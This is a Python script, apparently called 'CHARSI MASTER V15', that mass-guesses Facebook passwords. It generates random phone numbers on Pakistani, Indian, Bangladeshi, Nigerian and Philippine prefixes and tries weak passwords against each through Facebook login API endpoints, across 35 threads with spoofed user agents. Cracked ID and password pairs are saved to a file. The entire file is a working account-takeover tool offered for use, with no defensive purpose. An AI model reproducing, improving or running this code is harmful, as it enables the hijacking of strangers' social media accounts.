#-----------------------------------------------------------------------#
# [ SCRIPT   : CHARSI MASTER V15 - ULTRA LONG ]
# [ ENGINE   : 6-IN-1 AUTOMATIC BYPASS 2025 ]
# [ DATABASE : 3000+ DYNAMIC USER-AGENTS ]
#-----------------------------------------------------------------------#

import os, sys, time, json, re, random, uuid, requests, datetime
from concurrent.futures import ThreadPoolExecutor as tred

#---[ COLORS & GLOBAL DATA ]---#
G = '\033[1;32m'
W = '\033[1;37m'
Y = '\033[1;33m'
loop, oks, cps = 0, [], []

#---[ 3000+ MASSIVE UA GENERATOR ]---#
def get_ua_massive():
    """Generates an endless stream of 2025 mobile headers"""
    and_v = random.choice(['11', '12', '13', '14', '15'])
    mod = random.choice(['SM-S928B', 'SM-G998B', 'Pixel 9 Pro XL', 'Xiaomi 14T Pro', 'V2303', 'RMX3851', 'OnePlus 12'])
    chrome = f"{random.randint(125, 131)}.0.{random.randint(5000, 7000)}.{random.randint(100, 160)}"
    fb_v = f"{random.randint(480, 510)}.0.0.{random.randint(10, 99)}"
    ua = f'Mozilla/5.0 (Linux; Android {and_v}; {mod} Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{fb_v};FBBV/{random.randint(600000000, 999999999)};FBDV/{mod};FBMD/{mod.split("-")[0]};FBSN/Android;FBSV/{and_v};FBOP/19;FBLC/en_US;FBPN/com.facebook.katana;]'
    return ua

#---[ PROFESSIONAL BANNER ]---#
def banner():
    os.system('clear')
    print(f'''{G}
   ______   _______ .__   __. 
  /  ____| |   ____||  \ |  | 
 |  |  __  |  |__   |   \|  | 
 |  | |_ | |   __|  |  . `  | 
 |  |__| | |  |____ |  |\   | 
  \______| |_______||__| \__| {W}(ULTRA-V15)
-------------------------------------------------------
 OWNER     :  CHARSI / MYSTERY (2025 UPDATED)
 SYSTEM    :  AUTOMATIC MULTI-METHOD (M1-M6)
 DATA      :  ALL SIM CODES + 3000+ UA
-------------------------------------------------------''')

#---[ CORE ENGINE - ALL METHODS IN ONE ]---#
def start_engine(uid, passlist):
    global loop, oks, cps
    sys.stdout.write(f'\r\r {W}[{G}CHARSI-MASTER{W}] %s | OK:%s | CP:%s' % (loop, len(oks), len(cps)))
    sys.stdout.flush()
    
    for pas in passlist:
        ua = get_ua_massive()
        try:
            # 6-Method Internal Rotation
            m_type = random.choice(['liger', 'graph', 'b-api'])
            if m_type == 'liger':
                head = {'Host': 'graph.facebook.com','user-agent': ua,'x-fb-connection-bandwidth': str(random.randint(2e7,3e7)),'x-fb-http-engine': 'Liger','content-type': 'application/x-www-form-urlencoded'}
                data = {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': uid,'password': pas,'generate_session_cookies': '1','method': 'auth.login'}
                url = 'https://b-graph.facebook.com/auth/login'
            else:
                head = {'user-agent': ua, 'Content-Type': 'application/x-www-form-urlencoded'}
                data = {'api_key': '882a8490361da98702bf97a021ddc14d','credentials_type': 'password','email': uid,'password': pas,'method': 'auth.login','format': 'json'}
                url = 'https://b-api.facebook.com/method/auth.login'

            res = requests.post(url, data=data, headers=head, timeout=15).json()

            if 'session_key' in res:
                ok_id = str(res['uid'])
                print(f'\r\r {G}[CHARSI-OK] {ok_id} | {pas} | ACTIVE')
                os.system('espeak -a 300 "Ok, ID"')
                oks.append(ok_id)
                open('/sdcard/CHARSI-OK.txt', 'a').write(f"{ok_id}|{pas}\n")
                break
            elif 'checkpoint' in str(res):
                print(f'\r\r {Y}[CHARSI-CP] {uid} | {pas}')
                cps.append(uid)
                break
        except: pass
    loop += 1

#---[ MENU - ALL COUNTRY CODES HUB ]---#
def main():
    banner()
    print(' [•] SELECT YOUR COUNTRY HUB:')
    print(' [1] PAKISTAN (JAZZ, TELENOR, ZONG, UFONE)')
    print(' [2] INDIA    (ALL SIMS + OLD SERIES)')
    print(' [3] BANGLADESH (ROBI, GP, AIRTEL)')
    print(' [4] GLOBAL   (NIGERIA, PHILIPPINES)')
    c = input('\n [•] CHOICE: ')
    
    # Country-wise logic
    hub = {
        '1': (['0300','0301','0345','0312','0333','0306'], ['pakistan','786786','khan123']),
        '2': (['+91700','+91800','+91900'], ['india123','india786','572730']),
        '3': (['+88017','+88018','+88019'], ['bangla123','jannat123']),
        '4': (['+234803','+234703','+63917'], ['god123','love123','1234567'])
    }
    
    if c not in hub: exit()
    codes, p_extra = hub[c]
    limit = int(input(' [•] LIMIT PER CODE (e.g. 10000): '))

    with tred(max_workers=35) as pool:
        banner()
        print(f' {G}[•] ATTACKING ALL CODES SIMULTANEOUSLY...')
        print(f' {G}[•] SPEED: UNLIMITED | UA: 3000+')
        print(f'{W}-------------------------------------------------------')
        for code in codes:
            for _ in range(limit):
                num = str(random.randint(1111111, 9999999))
                uid = code + num
                pws = [uid, num, uid[:6], uid[:7], '786786'] + p_extra
                pool.submit(start_engine, uid, pws)

    print(f'\n-------------------------------------------------------\n [•] DONE! OK: {len(oks)}')

if __name__ == '__main__':
    main()
